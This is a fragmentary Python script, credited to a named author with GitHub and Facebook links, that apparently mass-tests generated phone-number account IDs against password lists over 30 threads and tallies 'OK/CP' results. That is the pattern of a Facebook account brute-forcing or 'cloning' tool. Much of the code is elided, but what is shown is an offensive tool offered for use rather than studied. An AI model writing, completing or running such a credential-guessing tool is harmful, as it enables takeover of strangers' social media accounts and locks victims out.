# SOURCE BY : AAYUSH
# GitHub : https://github.com/Gamerboy199v1
# Facebook : https://www.facebook.com/henry202477718
from os import path
...
•••••••••••••••••••••••••••••••••••••••••••••••••••')
\033[1;37m [•] \033[1;37mOwner     :   AAYUSH CHHETRI
...
def za():
    ...
    if myid in str(body):
        ...
        os.system("xdg-open https://wa.me/+9779827903940https://www.facebook.com/h")
def npxind():
                user=[]
                clear()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AAYUSH:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    AAYUSH.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    AAYUSH.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Aayuss:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    Aayuss.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    Aayuss.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
